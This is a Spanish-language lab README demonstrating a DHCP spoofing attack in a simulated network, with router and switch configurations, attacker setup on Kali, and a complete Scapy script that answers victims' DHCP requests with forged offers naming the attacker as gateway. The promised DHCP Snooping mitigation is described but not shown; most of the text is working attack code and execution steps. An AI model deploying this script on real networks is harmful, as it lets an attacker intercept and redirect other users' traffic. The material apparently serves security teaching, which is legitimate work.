# dhcp-spoofing
DHCP Spoofing Attack using Scapy
Descripción

Este laboratorio demuestra cómo un atacante puede ejecutar un ataque de DHCP Spoofing utilizando Python y Scapy dentro de una red simulada. El objetivo es interceptar las solicitudes DHCP de una víctima y responder con configuraciones falsas para redirigir el tráfico a través del equipo atacante.

También se muestra la implementación de una contramedida efectiva utilizando DHCP Snooping en el switch para bloquear servidores DHCP no autorizados.

Objetivo del Laboratorio
Comprender el funcionamiento del protocolo DHCP.
Implementar un ataque DHCP Spoofing mediante Scapy.
Observar cómo una víctima obtiene parámetros de red falsificados.
Implementar mecanismos de mitigación mediante DHCP Snooping.
Topología


Configuración del Router DHCP Legítimo (R2)
configure terminal

interface Ethernet0/0
 ip address 192.23.61.1 255.255.255.0
 no shutdown
 exit

ip dhcp excluded-address 192.23.61.1 192.23.61.19
ip dhcp excluded-address 192.23.61.100

ip dhcp pool LEGITIMO_POOL
 network 192.23.61.0 255.255.255.0
 default-router 192.23.61.1
 dns-server 8.8.8.8
 exit

end
write
Configuración Inicial del Switch (R1)
configure terminal

interface range Ethernet0/0 - 2
 no shutdown
 exit

end
write
Configuración de Kali Linux

Asignar la IP estática al equipo atacante:

sudo ip addr add 192.23.61.100/24 dev eth0 2>/dev/null || true
sudo ip link set dev eth0 up

Verificar:

ip addr show eth0
Script DHCP Spoofing (Scapy)

from scapy.all import *

# ==============================================================================
# CONFIGURACIÓN DEL ATAQUE
# ==============================================================================
IFACE = "eth0"                   # Interfaz de Kali apuntando al Switch
FAKE_SERVER_IP = "192.23.61.100"  # Tu propia IP de atacante
FAKE_NETMASK = "255.255.255.0"
FAKE_GATEWAY = "192.23.61.100"    # Nos ponemos como Gateway para interceptar datos
FAKE_DNS = "8.8.8.8"
OFFERED_IP = "192.23.61.222"       # IP falsa para la víctima
# ==============================================================================

def dhcp_spoofer(pkt):
    # Detectar paquetes DHCPDiscover (Message Type = 1)
    if DHCP in pkt and pkt[DHCP].options[0][1] == 1:
        print(f"\n[+] DHCP Discover detectado desde MAC: {pkt[Ether].src}")
        
        xid = pkt[BOOTP].xid
        print(f"[*] Generando DHCP Offer malicioso...")

        # Construcción del paquete falsificado de capa 2 a capa 7
        spoofed_offer = (
            Ether(src=get_if_hwaddr(IFACE), dst="ff:ff:ff:ff:ff:ff") /
            IP(src=FAKE_SERVER_IP, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, yiaddr=OFFERED_IP, siaddr=FAKE_SERVER_IP, xid=xid, chaddr=pkt[BOOTP].chaddr) /
            DHCP(options=[
                ("message-type", "offer"),
                ("server_id", FAKE_SERVER_IP),
                ("subnet_mask", FAKE_NETMASK),
                ("router", FAKE_GATEWAY),
                ("name_server", FAKE_DNS),
                ("lease_time", 43200),
                "end"
            ])
        )
        
        sendp(spoofed_offer, iface=IFACE, verbose=False)
        print(f"[v] ¡DHCP Offer falso enviado exitosamente!")

print(f"[*] Escuchando peticiones DHCP en [{IFACE}]...")
sniff(iface=IFACE, filter="udp and (port 67 or port 68)", prn=dhcp_spoofer, store=0)

Ejecución del Ataque

Ejecutar el script:

sudo python3 dhcp_spoof.py

En la máquina Windows:

ipconfig /release
ipconfig /renew

Verificar la configuración obtenida:

ipconfig /all

Resultado esperado:

IP Address : 192.23.61.222
Gateway    : 192.23.61.100
DNS Server : 8.8.8.8

La víctima utilizará al atacante como puerta de enlace predeterminada.

Evidencias

